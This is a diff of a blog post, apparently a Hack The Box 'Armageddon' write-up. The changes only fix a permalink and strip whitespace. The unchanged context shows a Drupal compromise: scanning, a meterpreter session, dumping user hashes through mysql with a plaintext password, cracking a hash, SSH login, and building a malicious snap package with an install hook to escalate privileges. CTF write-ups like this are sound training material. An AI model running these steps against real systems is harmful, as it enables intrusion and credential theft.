@@ -5,7 +5,7 @@ date: 2021-07-11 19:05:41.000000000 -05:00
 categories: [Hackthebox]
 tags: []
 author: traysoncombs
-permalink: "/armageddon-htb"
+permalink: "/armageddon-htb.html"
 ---
 <html><body>
 <div class="wp-block-image">
@@ -24,7 +24,7 @@ permalink: "/armageddon-htb"
 <p><!-- wp:code --></p>
 <pre class="wp-block-code"><code lang="bash" class="language-bash"> PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
- | ssh-hostkey: 
+ | ssh-hostkey:
  |   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
  |   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
  |_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
@@ -38,7 +38,7 @@ permalink: "/armageddon-htb"
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:code --></p>
 <pre class="wp-block-code"><code lang="bash" class="language-bash">$ droopescan scan drupal -u armageddon.htb
- [+] Plugins found:                                                              
+ [+] Plugins found:
      profile http://armageddon.htb/modules/profile/
      php http://armageddon.htb/modules/php/
      image http://armageddon.htb/modules/image/
@@ -78,9 +78,9 @@ meterpreter &gt; </code></pre>
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:code --></p>
 <pre class="wp-block-code"><code lang="php" class="language-php">$databases = array (
-   'default' =&gt; 
+   'default' =&gt;
    array (
-     'default' =&gt; 
+     'default' =&gt;
      array (
        'database' =&gt; 'drupal',
        'username' =&gt; 'drupaluser',
@@ -116,14 +116,14 @@ block_custom
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:code --></p>
 <pre class="wp-block-code"><code lang="bash" class="language-bash">mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "SELECT * FROM users" -D drupal
-uid    name                            pass    
+uid    name                            pass
 1        brucetherealadmin   <strong>$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------</strong></code></pre>
 <p><!-- /wp:code --></p>
 <p><!-- wp:paragraph --></p>
 <p>I then ran that hash through hashid to identify what type it is so as to ease the cracking process.</p>
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="bash" class="language-bash">$ hashid -j 
+<pre class="wp-block-code"><code lang="bash" class="language-bash">$ hashid -j
 $S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------
 Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------'
 [+] Drupal &gt; v7.x [JtR Format: <strong>drupal7</strong>]</code></pre>
@@ -148,7 +148,7 @@ Session completed</code></pre>
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:code --></p>
 <pre class="wp-block-code"><code lang="bash" class="language-bash">$ ssh brucetherealadmin@armageddon.htb
-brucetherealadmin@armageddon.htb's password: 
+brucetherealadmin@armageddon.htb's password:
 Last login: Sun Jul 11 19:25:10 2021 from 10.10.14.7
 [brucetherealadmin@armageddon ~]$ cat user.txt
 <strong>205e6df58-------------------------</strong></code></pre>
@@ -181,7 +181,7 @@ $ chmod +x meta/hooks/install
 $ fpm -n myflagnow -s dir -t snap -a all meta
 Created package {:path=&gt;"myflagnow_1.0_all.snap"}
 $ scp myflagnow_1.0_all.snap brucetherealadmin@armageddon.htb:~
- brucetherealadmin@armageddon.htb's password: 
+ brucetherealadmin@armageddon.htb's password:
 myflagnow_1.0_all.snap                                                                                   100% 4096    28.8KB/s   00:00</code></pre>
 <p><!-- /wp:code --></p>
 <p><!-- wp:paragraph --></p>
